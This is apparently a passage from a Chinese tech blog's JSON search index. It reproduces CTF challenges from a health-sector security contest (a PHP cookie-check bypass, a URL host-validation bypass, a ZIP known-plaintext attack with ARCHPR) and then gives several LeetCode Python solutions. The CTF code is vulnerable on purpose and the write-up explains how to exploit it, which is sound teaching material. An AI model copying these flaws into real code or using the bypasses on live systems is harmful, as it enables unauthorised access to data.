print(&quot;不符合低指数开放&quot;)\nflag{9955792527865472523f8b95be1a2718}\n","categories":["网络安全","CTF","竞赛"],"tags":["CTF","内部比赛"]},{"title":"第一届广东省卫生健康行业网络安全技能大赛部分题目复现","url":"/posts/d6fc/","content":"WebHTTP题目基本信息基础镜像：https://github.com/qsnctf/base_nginx_php_72考察点：代码审计、HTTP请求头伪造。www&gt;index.php&lt;?phpheader(&#x27;Content-type:text/html;charset=utf-8&#x27;);setcookie(&#x27;admin&#x27;,&#x27;0&#x27;);function getip() &#123;    if(getenv(&#x27;HTTP_CLIENT_IP&#x27;) &amp;&amp; strcmp(getenv(&#x27;HTTP_CLIENT_IP&#x27;), &#x27;unknown&#x27;)) &#123;         $ip = getenv(&#x27;HTTP_CLIENT_IP&#x27;);    &#125; elseif(getenv(&#x27;HTTP_X_FORWARDED_FOR&#x27;) &amp;&amp; strcmp(getenv(&#x27;HTTP_X_FORWARDED_FOR&#x27;), &#x27;unknown&#x27;)) &#123;         $ip = getenv(&#x27;HTTP_X_FORWARDED_FOR&#x27;);    &#125; elseif(getenv(&#x27;REMOTE_ADDR&#x27;) &amp;&amp; strcmp(getenv(&#x27;REMOTE_ADDR&#x27;), &#x27;unknown&#x27;)) &#123;         $ip = getenv(&#x27;REMOTE_ADDR&#x27;);    &#125; elseif(isset($_SERVER[&#x27;REMOTE_ADDR&#x27;]) &amp;&amp; $_SERVER[&#x27;REMOTE_ADDR&#x27;] &amp;&amp; strcmp($_SERVER[&#x27;REMOTE_ADDR&#x27;], &#x27;unknown&#x27;)) &#123;         $ip = $_SERVER[&#x27;REMOTE_ADDR&#x27;];    &#125;    return $ip;&#125;$ip = getip();if(preg_match(&#x27;/(127\\.\\0.\\.0\\.1\\.[^:]&#123;15&#125;)/&#x27;, $ip)) &#123;    exit(&#x27;不允许来自外地的人访问呦!!!&#x27;);&#125;if($_COOKIE[&#x27;admin&#x27;] !== &#x27;1&#x27;) &#123;    exit(&#x27;请登录后访问呀&#x27;);&#125;exit(file_get_contents(&#x27;/flag&#x27;));?&gt;\nflag.sh：#!/bin/shecho $FLAG &gt; /flagrm -f /flag.sh\nCookie 逻辑漏洞（核心）setcookie(&#39;admin&#39;,&#39;0&#39;); 与随后用 $_COOKIE[&#39;admin&#39;] 判断的顺序是错误/被滥用的：\n\nsetcookie() 是向客户端发送 Set-Cookie 响应头 —— 它只会在响应后让浏览器更新 cookie。\n$_COOKIE 代表的是“请求中已经带来的 cookie”，不会被 setcookie() 立即修改。也就是说，攻击者在请求里发送 Cookie: admin=1，服务器仍会在响应中给客户端 Set-Cookie: admin=0（下一次请求才生效），但本次执行里 $_COOKIE[&#39;admin&#39;] 仍为 &#39;1&#39; —— 检查会通过，从而绕过登录检查。IP 获取与正则（潜在混淆/学习点）\ngetip() 非常不可信（它优先使用 HTTP_CLIENT_IP、HTTP_X_FORWARDED_FOR 等可由客户端控制的头）。这是常见的“信任头部导致伪造源地址”的问题。\n正则 preg_match(&#39;/(127\\.\\0.\\.0\\.1\\.[^:]{15})/&#39;, $ip) 很怪：模式中有 \\0（NUL）和 [^:]{15}。这看起来像是在搞“null 字符/编码”的考查或是故意混淆。对普通的 IP（例如 127.0.0.1、1.2.3.4）通常不会匹配到这个模式，所以大多数真实请求不会被 exit(&#39;不允许来自外地的人访问呦!!!&#39;) 阻断。\n因此，IP 检查在题目中并不能阻止攻击者（除非服务器的 $ip 恰好匹配那个非常规模式）。这部分更像是迷惑/教学点（展示对 header 的盲信任和对正则转义/\\0 的细节）。直接读取文件 /flag如果通过了前两项检查，代码会直接 file_get_contents(&#39;/flag&#39;) 输出 flag。典型的 CTF “拿 flag”点就在这里。利用（解题）思路与步骤思路一句话： 直接在请求中把 admin cookie 设为 1，同时不要触发那条奇怪的 preg_match（用默认 IP 即可），然后访问该脚本，服务器会因为 $_COOKIE[&#39;admin&#39;]==&#39;1&#39; 而把 /flag 的内容输出给你。URL基础镜像：https://github.com/qsnctf/base_nginx_php_72考察点：代码审计、代码逻辑判断绕过\n\nwww&gt;index.php&lt;?phpheader(&quot;Content-type:text/html;charset=utf-8&quot;);include &#x27;flag.php&#x27;;highlight_file(__FILE__);if(isset($_POST[&#x27;url&#x27;])) &#123;    $url = $_POST[&#x27;url&#x27;];    if (filter_var($url, FILTER_VALIDATE_URL)) &#123;                $r = parse_url($url);        print_r($r);        if (preg_match(&#x27;/getflag\\.com$/&#x27;, $r[&#x27;host&#x27;])) &#123;                        if(file_get_contents($url)==&#x27;pentest&#x27;)&#123;                echo $flag;            &#125; else &#123;                echo &quot;error: 文件内容不是 pentest&quot;;            &#125;        &#125; else &#123;            echo &quot;error: host 不正确呢&quot;;        &#125;    &#125; else &#123;        echo &quot;error: url 不正确呀&quot;;    &#125;&#125; else &#123;    echo &quot;error: 需要url呐&quot;;&#125;?&gt;www&gt;flag.php&lt;?php$flag = file_get_contents(&#x27;/flag&#x27;);?&gt;flag.sh#!/bin/shecho $FLAG &gt; /flagexport FLAG=not_flagFLAG=not_flagrm -f /flag.sh\n关键逻辑\n接收 url 参数，先通过 filter_var(..., FILTER_VALIDATE_URL) 验证是否为 URL。\n用 parse_url 解析出 $r[&#39;host&#39;]，要求 host 以 getflag.com 结尾（preg_match(&#39;/getflag\\.com$/&#39;, $r[&#39;host&#39;])）。\n若通过，则 file_get_contents($url)，判断返回内容是否精确为字符串 &#39;pentest&#39;，若是则输出 flag。Misc坚强的压缩包原题是压缩包的已知明文攻击（Known-plaintext attack），已知明文攻击并不是魔法，也不是黑箱里的秘密武器。它源于加密系统的“可预测性”和“信息泄露”——当攻击者既有密文又知道其中一部分的明文时，能从两者的关系中反推出对解密有用的东西。想象把一段文字放进一个上锁的箱子。密文是被锁起来的箱子，明文是箱子里的物品。已知明文攻击就像攻击者手里同时有：\n一个看起来一模一样的空箱子（密文）；\n与箱内物品相同的一件物品（已知明文）。如果箱子锁的结构很简单（内部机械零件少、规律明显），那攻击者就能通过研究“某件已知物品是如何放进箱子并被锁上的”来反推锁的内部机制，从而打开其它同样类型的箱子。\n\n为什么“已知明文”会帮忙破解？\n因为加密算法/实现并非完美随机，它们把明文和密文联系在一起，泄露了可被利用的结构或状态。\n很多旧的 ZIP 实现使用的 ZipCrypto 就是经典例子：它内部状态小、基于线性CRC运算生成 keystream，且文件头是可预测的。攻击者用已知的文件头就能推导出 keystream，继而恢复内部状态并解密其它文件。现代 AES-based ZIP 通过更强的 KDF 与认证解决了这些问题。\n首先，准备一个docx文档，存储flag，一个png，作为单独的文件。先将这两个文件，打包一个有密码的压缩包：随后将png文件（也就是不是flag的文件），单独用同样的压缩方法、加密算法打包成单独的压缩包。使用ARCHPR工具，选择明文攻击（Plain-text），左上角选择包含密码的压缩包，明文文件选择没有密码的压缩包，点击开始即可。\n","categories":["网络安全","CTF","竞赛"],"tags":["CTF","题目复现","卫健行业比赛"]},{"title":"【LeetCode】力扣刷题记录-两数之和","url":"/posts/a855/","content":"给定一个整数数组 nums 和一个整数目标值 target，请你在该数组中找出 和为目标值 target  的那 两个 整数，并返回它们的数组下标。\n你可以假设每种输入只会对应一个答案，并且你不能使用两次相同的元素。\n你可以按任意顺序返回答案。\n示例 1：\n\n输入： nums = [2,7,11,15], target = 9输出：[0,1]解释：因为 nums[0] + nums[1] == 9 ，返回 [0, 1] 。\n\n示例 2：\n\n输入： nums = [3,2,4], target = 6输出：[1,2]\n\n示例 3：\n\n输入： nums = [3,3], target = 6输出：[0,1]\n\n提示：\n\n2 &lt;= nums.length &lt;= 104\n-109 &lt;= nums[i] &lt;= 109\n-109 &lt;= target &lt;= 109\n只会存在一个有效答案\n\n这个题是经典的 Two Sum（两数之和），最优解法使用哈希表（字典）在一次遍历中解决，时间复杂度为 O(n)。\n\n对于每个元素 num，计算出需要的另一个数 complement = target - num。\n如果 complement 已经在哈希表中，说明找到了答案。\n否则，将当前数和索引存入哈希表，继续遍历。\n\nfrom typing import Listclass Solution:    def twoSum(self, nums: List[int], target: int) -&gt; List[int]:        # 创建一个哈希表，用于存储数字和对应的下标        hashmap = &#123;&#125;        for i, num in enumerate(nums):            complement = target - num  # 计算目标差值            if complement in hashmap:                # 找到了满足条件的两个数，返回下标                return [hashmap[complement], i]            # 把当前数字加入哈希表            hashmap[num] = i\n\n","categories":["编程","LeetCode","算法"],"tags":["编程","算法","力扣","LeetCode"]},{"title":"【LeetCode】力扣刷题记录-两数相加","url":"/posts/5a9/","content":"给你两个 非空 的链表，表示两个非负的整数。它们每位数字都是按照 逆序 的方式存储的，并且每个节点只能存储 一位 数字。\n请你将两个数相加，并以相同形式返回一个表示和的链表。\n你可以假设除了数字 0 之外，这两个数都不会以 0 开头。\nclass Solution:    def addTwoNumbers(self, l1, l2):        head = cur = ListNode()        carry = 0        while l1 or l2 or carry:            carry += (l1.val if l1 else 0) + (l2.val if l2 else 0)            cur.next = ListNode(carry % 10)            cur = cur.next            carry //= 10            l1 = l1.next if l1 else None            l2 = l2.next if l2 else None        return head.next\n\n","categories":["编程","LeetCode","算法"],"tags":["编程","算法","力扣","LeetCode"]},{"title":"【LeetCode】力扣刷题记录-无重复字符的最长子串","url":"/posts/895b/","content":"给定一个字符串 s ，请你找出其中不含有重复字符的 最长 子串 的长度。\n示例 1:\n\n输入: s = “abcabcbb”输出: 3解释: 因为无重复字符的最长子串是 &quot;abc&quot;，所以其长度为 3。注意 “bca” 和 “cab” 也是正确答案。\n\n示例 2:\n\n输入: s = “bbbbb”输出: 1解释: 因为无重复字符的最长子串是 &quot;b&quot;，所以其长度为 1。\n\n示例 3:\n\n输入: s = “pwwkew”输出: 3解释: 因为无重复字符的最长子串是 &quot;wke&quot;，所以其长度为 3。     请注意，你的答案必须是 子串 的长度，&quot;pwke&quot; 是一个子序列，不是子串。\n\n提示：\n\n0 &lt;= s.length &lt;= 5 * 104\ns 由英文字母、数字、符号和空格组成\n\nclass Solution:    def lengthOfLongestSubstring(self, s: str) -&gt; int:        seen = set()        left = ans = 0        for ch in s:            while ch in seen:                seen.remove(s[left])                left += 1            seen.add(ch)            ans = max(ans, len(seen))        return ans\n\n","categories":["编程","LeetCode","算法"],"tags":["编程","算法","力扣","LeetCode"]},{"title":"【LeetCode】力扣刷题记录-寻找两个正序数组的中位数","url":"/posts/6965/","content":"给定两个大小分别为 m 和 n 的正序（从小到大）数组 nums1 和 nums2。请你找出并返回这两个正序数组的 中位数 。\n算法的时间复杂度应该为 O(log (m+n)) 。\n示例 1：\n\n输入： nums1 = [1,3], nums2 = [2]输出： 2.00000解释： 合并数组 = [1,2,3] ，中位数 2\n\n示例 2：\n\n输入： nums1 = [1,2], nums2 = [3,4]输出：2.50000解释：合并数组 = [1,2,3,4] ，中位数 (2 + 3) / 2 = 2.5\n\n提示：\n\nnums1.length == m\nnums2.length == n\n0 &lt;= m &lt;= 1000\n0 &lt;= n &lt;= 1000\n1 &lt;= m + n &lt;= 2000\n-106 &lt;= nums1[i], nums2[i] &lt;= 106\n\nclass Solution:    def findMedianSortedArrays(self, nums1: List[int], nums2: List[int]) -&gt; float:        # 保证 nums1 是较短的数组（在较短数组上二分，防止越界）        if len(nums1) &gt; len(nums2):            nums1, nums2 = nums2, nums1        m, n = len(nums1), len(nums2)        total_left = (m + n + 1) // 2  # 左半部分总元素个数        left, right = 0, m  # 在 nums1 上二分查找分割线位置        # 二分查找        while left &lt; right:            partition1 = (left + right + 1) // 2  # nums1 的切割位置            partition2 = total_left - partition1   # nums2 的切割位置            # 如果 nums1 的左侧太大，右移右边界            if nums1[partition1 - 1] &gt; nums2[partition2]:                right = partition1 - 1            else:                left = partition1        # 计算最终切割点        partition1, partition2 = left, total_left - left        # 分别取出分割线两侧的值（注意越界时取 ±∞）        max_left_1 = nums1[partition1 - 1] if partition1 &gt; 0 else float(&#x27;-inf&#x27;)        min_right_1 = nums1[partition1] if partition1 &lt; m else float(&#x27;inf&#x27;)        max_left_2 = nums2[partition2 - 1] if partition2 &gt; 0 else float(&#x27;-inf&#x27;)        min_right_2 = nums2[partition2] if partition2 &lt; n else float(&#x27;inf&#x27;)        # 根据总长度奇偶计算中位数        if (m + n) % 2 == 1:            # 奇数个元素：中位数是左半部分的最大值            return max(max_left_1, max_left_2)        else:            # 偶数个元素：中位数是左半部分最大与右半部分最小的平均值            return (max(max_left_1, max_left_2) + min(min_right_1, min_right_2)) / 2\n\n","categories":["编程","LeetCode","算法"],"tags":["编程","算法","力扣","LeetCode"]}]